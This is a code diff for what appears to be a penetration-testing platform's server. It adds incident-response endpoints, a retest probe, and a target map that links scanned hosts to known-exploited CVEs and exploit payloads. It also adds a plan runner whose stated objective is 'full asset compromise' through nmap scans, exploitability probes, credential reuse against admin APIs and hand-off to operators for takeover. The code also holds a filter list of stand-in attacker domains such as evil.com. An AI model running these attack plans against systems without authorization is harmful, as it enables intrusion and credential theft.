+  try {
+    const { type, value, notes } = req.body || {};
+    if (!type || !value) {
+      res.status(400).json({ error: 'type and value are required for IOC' });
+      return;
+    }
+
+    const incident = DFIRManager.addIOC(req.params.id, { type: type as IOCType, value, notes });
+    if (!incident) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json(incident);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to add IOC' });
+  }
+});
+
+app.post('/api/dfir/incidents/:id/ioc/:iocId/toggle-block', (req: Request, res: Response): void => {
+  try {
+    const blocked = typeof req.body?.blocked === 'boolean' ? req.body.blocked : undefined;
+    const incident = DFIRManager.toggleIOCBlock(req.params.id, req.params.iocId, blocked);
+    if (!incident) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json(incident);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to toggle IOC block' });
+  }
+});
+
+app.post('/api/dfir/incidents/:id/timeline', (req: Request, res: Response): void => {
+  try {
+    const { phase, description, actor, evidenceRef, mitreTactic } = req.body || {};
+    if (!phase || !description) {
+      res.status(400).json({ error: 'phase and description are required for timeline event' });
+      return;
+    }
+
+    const incident = DFIRManager.addTimelineEvent(req.params.id, {
+      timestamp: req.body?.timestamp || new Date().toISOString(),
+      phase,
+      description,
+      actor,
+      evidenceRef,
+      mitreTactic
+    });
+
+    if (!incident) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json(incident);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to add timeline event' });
+  }
+});
+
+app.get('/api/dfir/incidents/:id/report', (req: Request, res: Response): void => {
+  try {
+    const report = DFIRManager.generatePostMortemReport(req.params.id);
+    if (!report) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json(report);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to generate post-mortem report' });
+  }
+});
+
+app.post('/api/dfir/incidents/create-from-finding', (req: Request, res: Response): void => {
+  try {
+    const findingId = req.body?.findingId;
+    const finding = findingId ? findingsLedger.get(findingId) : undefined;
+
+    const incident = DFIRManager.createIncident({
+      title: finding ? `Incident Resolution: ${finding.claim.slice(0, 70)}` : (req.body?.title || 'Security Finding Incident'),
+      severity: finding?.severity === 'critical' ? 'CRITICAL' : finding?.severity === 'high' ? 'HIGH' : 'MEDIUM',
+      status: 'TRIAGE',
+      targetHost: finding?.target || req.body?.targetHost || 'localhost',
+      environment: 'Reported Security Scope',
+      attackVector: finding?.family || 'Vulnerability Exploitation',
+      mitreTechniques: [finding?.claim ? `Exploit: ${finding.claim.slice(0, 40)}` : 'T1190 - Exploit Public-Facing Application'],
+      forensicNotes: `Auto-generated from finding ID: ${findingId || 'N/A'}. Contract claim: ${finding?.claim || 'N/A'}`
+    });
+
+    res.status(201).json(incident);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to create incident from finding' });
+  }
+});
+
+// =============================================================================
+// "HACK, FIX, VERIFY" 1-CLICK RETEST ENGINE & EXPOSURE SCORE
+// =============================================================================
+
+app.post('/api/findings/:id/verify', async (req: Request, res: Response): Promise<void> => {
+  const finding = findingsLedger.get(req.params.id);
+  const body = req.body as Record<string, unknown>;
+  const targetUrl = typeof body.target === 'string' && body.target.trim()
+    ? body.target.trim()
+    : (finding?.target ? (finding.target.startsWith('http') ? finding.target : `http://${finding.target}`) : '');
+
+  if (!targetUrl && !finding) {
+    res.status(404).json({ error: 'Finding or target URL not found for re-verification.' });
+    return;
+  }
+
+  const start = Date.now();
+  let isVulnerable = false;
+  let statusText = 'Target verified and responded normally.';
+  let statusCode = 200;
+  let proof = '';
+
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 7000);
+    const probeRes = await fetch(targetUrl, {
+      method: (typeof body.method === 'string' ? body.method : 'GET'),
+      headers: { 'User-Agent': 'T3MP3ST/2.0 (Retest Engine)' },
+      signal: controller.signal
+    }).catch(err => {
+      return { ok: false, status: 0, text: async () => err.message || 'Connection failed' } as any;
+    });
+    clearTimeout(timer);
+
+    statusCode = probeRes.status || 0;
+    const bodyText = await probeRes.text().catch(() => '');
+    const expectedPattern = typeof body.pattern === 'string' ? body.pattern : (finding?.claim || '');
+
+    if (expectedPattern && bodyText.includes(expectedPattern)) {
+      isVulnerable = true;
+      statusText = `Vulnerability pattern "${expectedPattern.slice(0, 40)}" still reproduces in target response.`;
+      proof = bodyText.slice(0, 300);
+    } else {
+      isVulnerable = false;
+      statusText = `Vulnerability not reproduced. Target returned HTTP ${statusCode} without matching finding signature.`;
+      proof = `HTTP ${statusCode} in ${Date.now() - start}ms`;
+    }
+  } catch (err: any) {
+    isVulnerable = false;
+    statusText = `Target probe failed/closed: ${err.message || err}`;
+  }
+
+  const latencyMs = Date.now() - start;
+  const resultStatus = isVulnerable ? 'failed' : 'passed';
+
+  if (finding) {
+    finding.status = isVulnerable ? 'validated' : 'resolved';
+    finding.updatedAt = nowIso();
+    findingsLedger.set(finding.id, finding);
+
+    const retestRecord: RetestRecord = {
+      id: clientLedgerId(body.retestId, 'retest'),
+      findingId: finding.id,
+      missionId: finding.missionId,
+      operationId: finding.operationId,
+      status: resultStatus,
+      method: `1-Click Retest Probe against ${targetUrl}`,
+      acceptanceCriteria: ['Re-verify vulnerability signature against target endpoint'],
+      evidenceIds: finding.evidenceIds || [],
+      resultSummary: statusText,
+      createdAt: nowIso(),
+      updatedAt: nowIso()
+    };
+    retestLedger.set(retestRecord.id, retestRecord);
+    finding.retestIds.push(retestRecord.id);
+
+    emitContractEvent('retest.completed', { retestId: retestRecord.id, findingId: finding.id, status: resultStatus });
+  }
+
+  res.json({
+    success: true,
+    findingId: finding?.id || req.params.id,
+    target: targetUrl,
+    isFixed: !isVulnerable,
+    verificationStatus: isVulnerable ? 'STILL_VULNERABLE' : 'RESOLVED_FIXED',
+    latencyMs,
+    statusCode,
+    details: statusText,
+    proof,
+    timestamp: new Date().toISOString()
+  });
+});
+
+app.get('/api/mission/exposure-score', (_req: Request, res: Response) => {
+  const allFindings = [...findingsLedger.values()];
+  const openFindings = allFindings.filter(f => f.status !== 'resolved' && f.status !== 'false_positive');
+
+  let rawScore = 0;
+  let criticalCount = 0;
+  let highCount = 0;
+  let mediumCount = 0;
+  let lowCount = 0;
+
+  for (const f of openFindings) {
+    if (f.severity === 'critical') { rawScore += 25; criticalCount++; }
+    else if (f.severity === 'high') { rawScore += 15; highCount++; }
+    else if (f.severity === 'medium') { rawScore += 7; mediumCount++; }
+    else { rawScore += 2; lowCount++; }
+  }
+
+  const credCount = evidenceLedger ? [...evidenceLedger.values()].filter(e => e.type === 'receipt' || e.type === 'artifact').length : 0;
+  rawScore += Math.min(30, credCount * 5);
+
+  const exposureScore = Math.min(100, Math.round(rawScore));
+  let level: 'CRITICAL' | 'HIGH' | 'ELEVATED' | 'GUARDED' | 'SECURE' = 'SECURE';
+  if (exposureScore >= 80) level = 'CRITICAL';
+  else if (exposureScore >= 50) level = 'HIGH';
+  else if (exposureScore >= 25) level = 'ELEVATED';
+  else if (exposureScore > 0) level = 'GUARDED';
+
+  res.json({
+    success: true,
+    exposureScore,
+    level,
+    breakdown: {
+      totalFindings: allFindings.length,
+      openFindings: openFindings.length,
+      criticalCount,
+      highCount,
+      mediumCount,
+      lowCount,
+      harvestedCredentials: credCount
+    },
+    formula: 'Exploitability × Asset Criticality + Harvested Access'
+  });
+});
+
+// =============================================================================
+// TARGET MAP & ATTACK PLAN STRING GRAPH ENGINE (CROSS-REFERENCED WITH LIVE CVES)
+// =============================================================================
+
+interface TargetMapPlanStep {
+  id: string;
+  title: string;
+  kind: 'probe' | 'command';
+  target?: string;
+  checkId?: string;
+  command?: string;
+  timeoutMs?: number;
+  rationale?: string;
+}
+
+interface TargetMapNode {
+  id: string;
+  type: 'target' | 'service' | 'finding' | 'cve' | 'loot' | 'objective';
+  label: string;
+  targetHost: string;
+  tier: number;
+  severity?: 'critical' | 'high' | 'medium' | 'low' | 'info';
+  status?: string;
+  details: string;
+  mitreTactic?: string;
+  mitreTechnique?: string;
+  recommendedAction?: string;
+  recommendedCommand?: string;
+  recommendedTool?: string;
+  /** Evidence-backed counts behind this node's claim — nothing enters the map without a record. */
+  evidence?: { findings: number; cves: number; creds: number };
+  /** Executable steps toward FULL ASSET COMPROMISE (objective nodes only). */
+  plan?: TargetMapPlanStep[];
+  cveData?: {
+    cveId: string;
+    vulnerabilityName: string;
+    epssScore: number;
+    epssPercentile: number;
+    knownRansomware: boolean;
+    cisaAction?: string;
+    hasActiveProbe?: boolean;
+    /** Operator exploit payloads for this CVE, when the catalog has an entry. */
+    payloads?: import('./tools/cve-payloads.js').CvePayloadEntry | null;
+  };
+}
+
+interface TargetMapLink {
+  source: string;
+  target: string;
+  relationship: string;
+  severity?: 'critical' | 'high' | 'medium' | 'info';
+}
+
+app.get('/api/mission/target-map', async (req: Request, res: Response): Promise<void> => {
+  try {
+    const allFindings = [...findingsLedger.values()];
+    const allEvidence = [...evidenceLedger.values()];
+    const allCreds = [...credentialsLedger.values()];
+    const targetFilter = typeof req.query.target === 'string' ? req.query.target.trim() : '';
+
+    const nodes: TargetMapNode[] = [];
+    const links: TargetMapLink[] = [];
+    const attackPaths: Array<{ id: string; title: string; targetHost: string; steps: string[]; severity: string; exploitability: string }> = [];
+
+    // ACCURACY RULE: hosts enter the map ONLY from real ledger records (findings / evidence /
+    // captured credentials) AND only when they look like actual network hosts. The old map
+    // minted Tier-1 "targets" from code tokens and file names found in finding text
+    // (document.cookie, svchost.exe, libc.so, os.system, …).
+    const hostOf = (t: unknown): string => String(t || '').replace(/^https?:\/\//, '').split('/')[0].split(':')[0].trim().toLowerCase();
+    const isInternalUuid = (h: string) => /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(h);
+    // Real infrastructure TLDs we accept (allowlist, not blocklist — code tokens like
+    // os.system / params.temperature / user.role must never become Tier-1 targets).
+    const TLD_ALLOW = new Set(['com','net','org','gov','edu','io','ai','me','dev','xyz','info','biz','online','site','app','cloud','local','internal','lab','corp','test','intranet','lan','uk','ca','de','fr','nl','ru','cn','jp','br','in','au','us','tt','cm','co','tv','gg','sh','to','fm','am','mil','eu','se','no','fi','ch','at','es','it','pl','pt','cz','kr','sg','hk','za','ng','mx','ar','cl','co.nz','com.au','co.uk','gov.uk','com.tr']);
+    // Doctrine/simulation domains that exist only in training text, never as real targets.
+    const JUNK_HOSTS = new Set(['c2.evil.com', 'evil.com', 'malware.corp', 'hooked.site', 'placeholder.invalid']);
+    const isPlausibleHost = (h: string): boolean => {
+      if (!h || h.length > 253 || /\s|\(/.test(h)) return false;
+      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h)) return true; // IPv4
+      if (h === 'localhost' || h.endsWith('.localhost')) return true;
+      if (JUNK_HOSTS.has(h)) return false;
+      if (!/^[a-z0-9-]+(\.[a-z0-9-]+)*$/i.test(h)) return false;
+      const parts = h.split('.');
+      if (parts.length < 2) return false; // bare tokens ('target', 'range', 'attacker') are not hosts
+      const tld = parts[parts.length - 1];
+      if (!TLD_ALLOW.has(tld.toLowerCase())) return false;
+      return true;
+    };
+    const hostCounts = new Map<string, number>();
+    const noteHost = (raw: unknown): void => {
+      const h = hostOf(raw);
+      if (!h || isInternalUuid(h) || !isPlausibleHost(h)) return;
+      hostCounts.set(h, (hostCounts.get(h) || 0) + 1);
+    };
+    if (targetFilter) noteHost(targetFilter);
+    for (const f of allFindings) noteHost(f.target);
+    for (const e of allEvidence) noteHost((e as any).target || (e as any).targetHost || '');
+    for (const c of allCreds) noteHost((c as any).domain || (c as any).target || '');
+    // One-off tokens usually ride along inside prose/code; real targets recur across records
+    // (or are IPs / the operator's explicit filter).
+    const isIp = (h: string) => /^\d{1,3}(\.\d{1,3}){3}$/.test(h);
+    const hostSet = new Set<string>();
+    for (const [h, count] of hostCounts) {
+      if (isIp(h) || h === hostOf(targetFilter) || count >= 2) hostSet.add(h);
+    }
+
+    if (hostSet.size === 0) {
+      res.json({
+        success: true,
+        empty: true,
+        nodes: [],
+        links: [],
+        attackPaths: [],
+        summary: { totalTargets: 0, totalNodes: 0, totalLinks: 0, correlatedCveCount: 0, highEpssCount: 0, attackPathsCount: 0 },
+        message: 'No targets with captured evidence yet — run a scan to populate the attack map.',
+      });
+      return;
+    }
+
+    const hostList = Array.from(hostSet);
+
+    let highEpssCount = 0;
+    let correlatedCveCount = 0;
+    // Probe candidates harvested during correlation (host → KEV entries with a safe active probe),
+    // consumed by the per-host objective plan below.
+    const hostProbeCandidates: Array<{ host: string; cveID: string; epssScore: number; activeProbeId?: string; severity?: string; vulnerabilityName?: string }> = [];
+
+    for (let hIdx = 0; hIdx < hostList.length; hIdx++) {
+      const host = hostList[hIdx];
+      const targetNodeId = `tgt_${hIdx + 1}`;
+
+      nodes.push({
+        id: targetNodeId,
+        type: 'target',
+        label: `🎯 ${host}`,
+        targetHost: host,
+        tier: 1,
+        severity: 'info',
+        details: `Primary engagement target host: ${host}. Network ingress point.`,
+        mitreTactic: 'Reconnaissance',
+        mitreTechnique: 'T1595 - Active Scanning',
+        recommendedAction: 'Execute full port and service banner enumeration probe.',
+        recommendedCommand: `nmap -sV -sC -Pn -T4 ${host}`,
+        recommendedTool: 'nmap / naabu'
+      });
+
+      // Records for this host (findings, evidence, captured credentials)
+      const hostFindings = allFindings.filter(f => f.target && f.target.includes(host));
+      const hostCveMatches: Array<{ cveID: string; epssScore: number; activeProbeId?: string; severity?: string; vulnerabilityName?: string }> = [];
+      const hostCreds = allCreds.filter(c => ((c as any).domain || (c as any).target || '').includes(host));
+      const hostEvidenceText = [
+        ...hostFindings.map(f => `${f.title || ''} ${f.claim || ''} ${f.impact || ''}`),
+        ...allEvidence.filter(e => String((e as any).target || '').includes(host)).map(e => `${(e as any).title || ''} ${(e as any).summary || ''} ${(e as any).detail || ''}`),
+        ...hostCreds.map(c => `${(c as any).notes || ''} ${(c as any).source || ''}`),
+      ].join(' ').toLowerCase();
+
+      // Extract technologies — EVIDENCE-BACKED ONLY. The old host-NAME heuristics
+      // ("host includes 'web' → php/apache") fabricated services that were never observed.
+      const techKeywords: string[] = ['php', 'apache', 'nginx', 'openssh', 'spring', 'citrix', 'mysql', 'activemq', 'tomcat', 'iis', 'wordpress', 'jenkins', 'docker', 'kubernetes', 'django', 'flask', 'express', 'node', 'asp.net', 'wsc', 'woltlab', 'vite', 'next'];
+      const detectedTechs: string[] = [];
+      for (const kw of techKeywords) {
+        if (hostEvidenceText.includes(kw) && !detectedTechs.includes(kw)) detectedTechs.push(kw);
+      }
+
+      // Add Service Nodes (Tier 2) — evidence-backed only
+      for (let sIdx = 0; sIdx < detectedTechs.length; sIdx++) {
+        const tech = detectedTechs[sIdx];
+        const svcNodeId = `svc_${hIdx + 1}_${sIdx + 1}`;
+
+        nodes.push({
+          id: svcNodeId,
+          type: 'service',
+          label: `🌐 ${tech.toUpperCase()} Service`,
+          targetHost: host,
+          tier: 2,
+          severity: 'medium',
+          details: `${tech.toUpperCase()} fingerprint observed in ${hostFindings.length} finding/evidence record(s) on ${host}.`,
+          mitreTactic: 'Discovery',
+          mitreTechnique: 'T1046 - Network Service Discovery',
+          recommendedAction: `Perform specialized ${tech.toUpperCase()} fingerprinting and vulnerability surface probing.`,
+          recommendedCommand: `httpx -u http://${host} -probe -sc -tech-detect`,
+          recommendedTool: 'httpx / whatweb'
+        });
+
+        links.push({
+          source: targetNodeId,
+          target: svcNodeId,
+          relationship: 'exposes',
+          severity: 'info'
+        });
+
+        // Correlate with Live CISA KEV & EPSS
+        const cveMatches = CveCorrelator.correlate({ target: host, technologies: [tech] });
+        const topMatches = (cveMatches.matches || []).slice(0, 2);
+
+        for (let cIdx = 0; cIdx < topMatches.length; cIdx++) {
+          const match = topMatches[cIdx];
+          const cveNodeId = `cve_${hIdx + 1}_${sIdx + 1}_${cIdx + 1}`;
+          correlatedCveCount++;
+          if (match.epssScore >= 0.5) highEpssCount++;
+          hostCveMatches.push({ cveID: match.cveID, epssScore: match.epssScore, activeProbeId: (match as any).activeProbeId, severity: String(match.severity), vulnerabilityName: match.vulnerabilityName });
+
+          nodes.push({
+            id: cveNodeId,
+            type: 'cve',
+            label: `⚡ ${match.cveID} (${(match.epssScore * 100).toFixed(0)}% EPSS)`,
+            targetHost: host,
+            tier: 3,
+            severity: match.severity,
+            details: `CISA KEV Exploit: ${match.vulnerabilityName}. ${match.shortDescription}`,
+            mitreTactic: 'Initial Access',
+            mitreTechnique: 'T1190 - Exploit Public-Facing Application',
+            recommendedAction: `Deploy safe targeted rapid response probe for ${match.cveID}. ${match.requiredAction || ''}`,
+            recommendedCommand: match.activeProbeId
+              ? `curl -X POST http://localhost:3333/api/tools/rapid-response/check -H 'Content-Type: application/json' -d '{"probeId":"${match.activeProbeId}","target":"http://${host}"}'`
+              : `sploitus search "${match.cveID}"`,
+            recommendedTool: match.activeProbeId ? `Rapid Response (${match.activeProbeId})` : 'Sploitus / Nuclei',
+            cveData: {
+              cveId: match.cveID,
+              vulnerabilityName: match.vulnerabilityName,
+              epssScore: match.epssScore,
+              epssPercentile: match.epssPercentile,
+              knownRansomware: match.knownRansomwareCampaignUse === 'Known',
+              cisaAction: match.requiredAction,
+              hasActiveProbe: match.hasActiveProbe,
+              payloads: getPayloadsForCve(match.cveID) || undefined
+            }
+          });
+
+          links.push({
+            source: svcNodeId,
+            target: cveNodeId,
+            relationship: 'vulnerable_to',
+            severity: match.severity === 'critical' ? 'critical' : 'high'
+          });
+        }
+
+        // Remember per-host probe candidates for the objective plan (deduped below).
+        hostProbeCandidates.push(...hostCveMatches.filter(m => m.activeProbeId).map(m => ({ host, ...m })));
+      }
+
+      // ACCURACY RULE — Loot (Tier 4) is built ONLY from actually captured credentials
+      // (credentialsLedger). The old code minted a speculative "Harvested Secret Token"
+      // node for every high-EPSS CVE, claiming tokens that were never extracted.
+      const lootNodes: TargetMapNode[] = [];
+      for (let cIdx = 0; cIdx < Math.min(hostCreds.length, 4); cIdx++) {
+        const c = hostCreds[cIdx] as any;
+        const lootNodeId = `loot_${hIdx + 1}_${cIdx + 1}`;
+        const secretShown = (c.secret && c.secret !== '[redacted]') ? c.secret : (c.secretCaptured ? '[secret captured]' : (c.username || 'value on file'));
+        lootNodes.push({
+          id: lootNodeId,
+          type: 'loot',
+          label: `🔑 ${c.username || c.type || 'credential'}${c.privilegeLevel ? ' · ' + String(c.privilegeLevel).toUpperCase() : ''}`,
+          targetHost: host,
+          tier: 4,
+          severity: (c.privilegeLevel === 'admin' || c.privilegeLevel === 'root') ? 'critical' : 'high',
+          details: `Captured credential (${c.type || 'unknown'}): ${c.username || '-'} @ ${c.domain || host}. Secret: ${secretShown}. Source: ${c.source || 'ledger'}.`,
+          mitreTactic: 'Credential Access',
+          mitreTechnique: 'T1552 - Unsecured Credentials',
+          recommendedAction: 'Verify credential validity and test for lateral movement opportunities.',
+          recommendedCommand: `curl -H "Authorization: Bearer <TOKEN>" http://${host}/api/admin`,
+          recommendedTool: 'Credential Validator / Hydra',
+          evidence: { findings: 0, cves: 0, creds: 1 }
+        });
+        nodes.push(lootNodes[lootNodes.length - 1]);
+      }
+
+      // OBJECTIVE (Tier 5) — ALWAYS present, and the mission objective is ALWAYS
+      // FULL ASSET COMPROMISE. The plan contains only executable, evidence-anchored steps.
+      const objNodeId = `obj_${hIdx + 1}`;
+      const probeSteps: TargetMapPlanStep[] = [];
+      const seenProbes = new Set<string>();
+      for (const cand of hostProbeCandidates.filter(p => p.host === host)) {
+        if (seenProbes.has(cand.activeProbeId!)) continue;
+        seenProbes.add(cand.activeProbeId!);
+        probeSteps.push({
+          id: `step_probe_${probeSteps.length + 1}`,
+          title: `Confirm ${cand.cveID} exploitability`,
+          kind: 'probe',
+          target: `http://${host}`,
+          checkId: cand.activeProbeId!,
+          timeoutMs: 10000,
+          rationale: `${cand.cveID} correlated at ${(cand.epssScore * 100).toFixed(0)}% EPSS (CISA KEV) — safe canary probe available`,
+        });
+        if (probeSteps.length >= 4) break;
+      }
+      const plan: TargetMapPlanStep[] = [
+        {
+          id: 'step_surface',
+          title: 'Surface & service enumeration',
+          kind: 'command',
+          command: `nmap -Pn -F -T4 --max-retries 1 ${host}`,
+          timeoutMs: 90000,
+          rationale: 'Establish the live service surface for the compromise chain',
+        },
+        ...probeSteps,
+      ];
+      const objectiveNode: TargetMapNode = {
+        id: objNodeId,
+        type: 'objective',
+        label: `👑 FULL ASSET COMPROMISE`,
+        targetHost: host,
+        tier: 5,
+        severity: 'critical',
+        status: 'planned',
+        details: `Standing mission objective for ${host}: full asset compromise. Evidence on record: ${hostFindings.length} finding(s), ${hostCreds.length} captured credential(s), ${probeSteps.length} exploit-confirmation probe(s) ready. Execute the plan to confirm exploitability, then dispatch operators for takeover.`,
+        mitreTactic: 'Impact',
+        mitreTechnique: 'TA0010/T1496 — full-chain compromise objective',
+        recommendedAction: '▶ Run the laid-out plan: enumerate surface, confirm KEV exploitability with safe probes, then dispatch operators for full takeover.',
+        recommendedCommand: `POST /api/mission/target-map/run {"target":"${host}"}`,
+        recommendedTool: 'Target Map Plan Runner',
+        evidence: { findings: hostFindings.length, cves: probeSteps.length, creds: hostCreds.length },
+        plan,
+      };
+      nodes.push(objectiveNode);
+
+      // Links into the objective: real loot chains through credentials; CVEs advance directly.
+      if (lootNodes.length > 0) {
+        for (const ln of lootNodes) {
+          links.push({ source: probeSteps.length ? `cve_${hIdx + 1}_1_1` : targetNodeId, target: ln.id, relationship: 'unlocks', severity: (ln.severity === 'critical' ? 'critical' : 'high') });
+          links.push({ source: ln.id, target: objNodeId, relationship: 'leads_to', severity: 'critical' });
+        }
+      } else if (probeSteps.length > 0) {
+        const firstCve = nodes.find(n => n.id.startsWith(`cve_${hIdx + 1}`));
+        if (firstCve) links.push({ source: firstCve.id, target: objNodeId, relationship: 'advances_toward', severity: 'critical' });
+      } else {
+        links.push({ source: targetNodeId, target: objNodeId, relationship: 'advances_toward', severity: 'high' });
+      }
+
+      // Attack storyline — states ONLY what is on record, then the next executable action.
+      const storySeverity = hostCreds.some(c => (c as any).privilegeLevel === 'admin') || probeSteps.length > 0 ? 'CRITICAL' : (hostFindings.length > 0 ? 'HIGH' : 'INFO');
+      attackPaths.push({
+        id: `path_${hIdx + 1}`,
+        title: `Full Asset Compromise — ${host}`,
+        targetHost: host,
+        steps: [
+          `1. Ingress ${host} — ${hostFindings.length} validated finding(s) on record`,
+          detectedTechs.length ? `2. Evidence-backed services: ${detectedTechs.map(t => t.toUpperCase()).join(', ')}` : `2. No service fingerprints on record yet — surface enumeration is plan step 1`,
+          hostCveMatches.length || hostProbeCandidates.some(p => p.host === host)
+            ? `3. KEV-correlated exploit candidates: ${[...new Set([...hostCveMatches.map(m => m.cveID), ...hostProbeCandidates.filter(p => p.host === host).map(p => p.cveID)])].slice(0, 4).join(', ')} — safe probes staged in the plan`
+            : `3. No KEV exploit candidate correlated yet — run surface enumeration to fingerprint services`,
+          hostCreds.length
+            ? `4. ${hostCreds.length} credential(s) already captured (${[...new Set(hostCreds.map((c: any) => c.type).filter(Boolean))].slice(0, 3).join(', ')}) — authenticated pivoting available to operators`
+            : `4. No credentials captured yet — confirmed exploits unlock the credential phase`,
+          `5. 👑 OBJECTIVE: FULL ASSET COMPROMISE — ▶ run the plan (${plan.length} steps) to confirm exploitability, then dispatch operators for takeover`,
+        ],
+        severity: storySeverity,
+        exploitability: probeSteps.length > 0 ? `HIGH — ${probeSteps.length} active probe(s) ready` : 'RECON FIRST — no probe staged yet',
+      });
+
+      // Connect any direct findings
+      for (let fIdx = 0; fIdx < hostFindings.length; fIdx++) {
+        const finding = hostFindings[fIdx];
+        const fndNodeId = `fnd_${finding.id}`;
+
+        if (!nodes.some(n => n.id === fndNodeId)) {
+          nodes.push({
+            id: fndNodeId,
+            type: 'finding',
+            label: `💥 ${finding.title || finding.claim.slice(0, 32)}`,
+            targetHost: host,
+            tier: 3,
+            severity: finding.severity as any,
+            details: `Validated Security Finding: ${finding.claim}. Impact: ${finding.impact}`,
+            mitreTactic: 'Exploitation',
+            mitreTechnique: 'T1190 - Exploit Public-Facing Application',
+            recommendedAction: `Re-verify finding fix with 1-click active probe or dispatch DFIR remediation.`,
+            recommendedCommand: `curl -X POST http://localhost:3333/api/findings/${finding.id}/verify`,
+            recommendedTool: 'Retest Engine / DFIR'
+          });
+
+          links.push({
+            source: targetNodeId,
+            target: fndNodeId,
+            relationship: 'vulnerable_to',
+            severity: finding.severity === 'critical' ? 'critical' : 'high'
+          });
+        }
+      }
+    }
+
+    res.json({
+      success: true,
+      nodes,
+      links,
+      attackPaths,
+      summary: {
+        totalTargets: hostList.length,
+        totalNodes: nodes.length,
+        totalLinks: links.length,
+        correlatedCveCount,
+        highEpssCount,
+        attackPathsCount: attackPaths.length
+      }
+    });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to generate target map' });
+  }
+});
+
+// ═══ TARGET MAP PLAN RUNNER — execute the laid-out objective plan ═══
+// Rebuilds the host's evidence-anchored plan and executes it step by step:
+// surface enumeration via the gated command runner, KEV exploitability via safe
+// rapid-response canary probes. Mission objective is ALWAYS full asset compromise.
+app.post('/api/mission/target-map/run', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body as Record<string, unknown>;
+  const rawTarget = typeof body.target === 'string' ? body.target.trim() : '';
+  const host = rawTarget.replace(/^https?:\/\//, '').split('/')[0].split(':')[0].trim();
+  if (!host) { res.status(400).json({ error: 'target required' }); return; }
+
+  const guard = guardAction(body, 'mission_execution', host, `Execute full-asset-compromise attack plan against ${host}`);
+  if (!guard.allowed) { blockForApproval(res, guard); return; }
+
+  try {
+    const allFindings = [...findingsLedger.values()];
+    const allCreds = [...credentialsLedger.values()];
+    const hostCreds = allCreds.filter(c => (String((c as any).domain || (c as any).target || '')).includes(host));
+
+    // Correlate KEV candidates the same way the map GET does, so the run executes
+    // exactly what the plan the operator clicked laid out.
+    const evidenceText = [
+      ...allFindings.filter(f => f.target && f.target.includes(host)).map(f => `${f.title || ''} ${f.claim || ''} ${f.impact || ''}`),
+    ].join(' ').toLowerCase();
+    const techKeywords: string[] = ['php', 'apache', 'nginx', 'openssh', 'spring', 'citrix', 'mysql', 'activemq', 'tomcat', 'iis', 'wordpress', 'jenkins', 'docker', 'kubernetes', 'django', 'flask', 'express', 'node', 'asp.net', 'wsc', 'woltlab', 'vite', 'next'];
+    const detectedTechs = techKeywords.filter(kw => evidenceText.includes(kw));
+    const probeCandidates: Array<{ checkId: string; cveID: string; epssScore: number }> = [];
+    const seen = new Set<string>();
+    for (const tech of detectedTechs) {
+      const matches = (CveCorrelator.correlate({ target: host, technologies: [tech] }).matches || []).slice(0, 2);
+      for (const m of matches) {
+        if (!m.activeProbeId || seen.has(m.activeProbeId)) continue;
+        seen.add(m.activeProbeId);
+        probeCandidates.push({ checkId: m.activeProbeId, cveID: m.cveID, epssScore: m.epssScore });
+      }
+    }
+
+    type StepResult = { id: string; title: string; kind: string; status: 'confirmed' | 'ran' | 'failed' | 'error'; detail: string; durationMs: number };
+    const results: StepResult[] = [];
+    const t0 = Date.now();
+
+    // Step 1 — surface & service enumeration (fast profile: the run must complete, not marinate)
+    const surfaceCmd = `nmap -Pn -F -T4 --max-retries 1 ${host}`;
+    const surfaceStart = Date.now();
+    const surface = await executeCommand(surfaceCmd, 90000);
+    results.push({
+      id: 'step_surface', title: 'Surface & service enumeration', kind: 'command',
+      status: surface.success ? 'ran' : 'failed',
+      detail: (surface.output || surface.error || '').split('\n').filter(Boolean).slice(-8).join(' | ').substring(0, 600),
+      durationMs: Date.now() - surfaceStart,
+    });
+
+    // Steps 2..n — KEV exploitability confirmation via safe probes
+    for (const cand of probeCandidates.slice(0, 4)) {
+      const stepStart = Date.now();
+      try {
+        const rr = await RapidResponseEngine.runCheck(cand.checkId, `http://${host}`, 10000);
+        results.push({
+          id: `step_probe_${cand.checkId}`, title: `Confirm ${cand.cveID} exploitability`, kind: 'probe',
+          status: rr.vulnerable ? 'confirmed' : 'ran',
+          detail: `probe=${cand.checkId} vulnerable=${rr.vulnerable} ${(rr as any).summary || (rr as any).evidence || ''}`.substring(0, 400),
+          durationMs: Date.now() - stepStart,
+        });
+      } catch (e: any) {
+        results.push({
+          id: `step_probe_${cand.checkId}`, title: `Confirm ${cand.cveID} exploitability`, kind: 'probe',
+          status: 'error', detail: String(e?.message || e).substring(0, 300), durationMs: Date.now() - stepStart,
+        });
+      }
+    }
+
+    const confirmed = results.filter(r => r.status === 'confirmed').length;
+    const failed = results.filter(r => r.status === 'failed' || r.status === 'error').length;
+    const report = {
+      objective: 'FULL ASSET COMPROMISE',
+      target: host,
+      startedAt: new Date(t0).toISOString(),
+      durationMs: Date.now() - t0,
+      capturedCreds: hostCreds.length,
+      steps: results,
+      summary: `${results.length} step(s): ${confirmed} exploit candidate(s) confirmed, ${failed} failed, ${results.length - confirmed - failed} ran clean. Next: ${confirmed > 0 ? 'dispatch operators to weaponize the confirmed candidates and pursue full takeover' : 'probe results are negative/reachable-only — extend recon or stage the operator mission'}.`,
+    };
+    try { emitContractEvent('target_map.plan_run', { target: host, confirmed, steps: results.length }); } catch { /* intel feed best-effort */ }
+    res.json({ success: true, ...report });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Plan execution failed' });
+  }
+});
+
+app.get('/api/tools', (_req: Request, res: Response) => {
+  res.json({
     success: true,
     tools: SAFE_COMMANDS,
     count: SAFE_COMMANDS.length,
